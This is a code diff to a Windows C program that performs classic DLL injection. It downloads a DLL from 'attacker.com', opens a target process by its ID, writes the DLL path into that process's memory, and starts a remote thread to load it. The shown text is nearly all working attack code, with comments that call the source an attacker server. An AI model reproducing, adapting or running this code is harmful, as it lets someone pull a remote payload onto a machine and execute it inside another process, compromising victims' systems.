@@ -6,11 +6,13 @@
 #include <urlmon.h> // For URLDownloadToFile
 #pragma comment(lib, "urlmon.lib")
 
+// Download DLL from attacker server
 const char* dllURL = "http://attacker.com/malicious.dll"; 
 
+// Save DLL to specified location
 int main(int argc, char* argv[]) {
     // Download the DLL file
-    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\Tools\\evil.dll", 0, NULL);
+    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\Path\\malicious.dll", 0, NULL);
     if (FAILED(hr)) {
         printf("Failed to download DLL: 0x%x\n", hr);
         return 1;
@@ -36,10 +38,10 @@ int main(int argc, char* argv[]) {
     phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
 
     // Allocate memory buffer in the target process for DLL path
-    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\Tools\\malicious.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\Path\\malicious.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
     // Copy DLL file path to the allocated memory in the target process
-    WriteProcessMemory(phandle, rbuffer, "C:\\Tools\\malicious.dll", strlen("C:\\Tools\\malicious.dll") + 1, NULL);
+    WriteProcessMemory(phandle, rbuffer, "C:\\Path\\malicious.dll", strlen("C:\\Path\\malicious.dll") + 1, NULL);
 
     // Create a remote thread in the target process to load the DLL
     rthread = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rbuffer, 0, NULL);
